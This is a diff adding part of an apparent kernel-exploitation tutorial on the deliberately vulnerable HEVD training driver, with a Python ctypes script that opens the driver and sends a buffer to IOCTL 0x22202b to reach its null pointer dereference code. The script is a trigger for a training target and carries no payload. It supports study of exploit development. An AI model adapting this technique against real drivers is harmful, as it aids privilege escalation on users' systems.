@@ -55,4 +55,50 @@ Ok, we see the eventual call to `TriggerNullPointerDereference` now, let's go ba
 
 ![](/assets/images/AWE/ioctlparse.PNG)
 
+So we can see that we'll `jz` to our desired code path with an IOCTL of `0x22202b`. Let' script this up and test it. We'll put a breakpoint in with `bp HEVD!TriggerNullPointerDereference` and see if we hit it. Here's our script right now:
+```python
+import ctypes, sys, struct
+from ctypes import *
+from ctypes.wintypes import *
+from subprocess import *
+import sys
 
+kernel32 = windll.kernel32
+
+def interact():
+    
+    hevd = kernel32.CreateFileA(
+        "\\\\.\\HackSysExtremeVulnerableDriver", 
+        0xC0000000, 
+        0, 
+        None, 
+        0x3, 
+        0, 
+        None)
+    
+    if (not hevd) or (hevd == -1):
+        print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
+        sys.exit(1)
+    else:
+        print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
+
+    buf = "A" * 100
+        
+    result = kernel32.DeviceIoControl(
+        hevd,
+        0x22202b,
+        buf,
+        len(buf),
+        None,
+        0,
+        byref(c_ulong()),
+        None
+    )
+
+    if result != 0:
+        print("[*] Payload sent.")
+    else:
+        print("[!] Payload failed. Last error: " + str(GetLastError()))
+
+interact()
+```
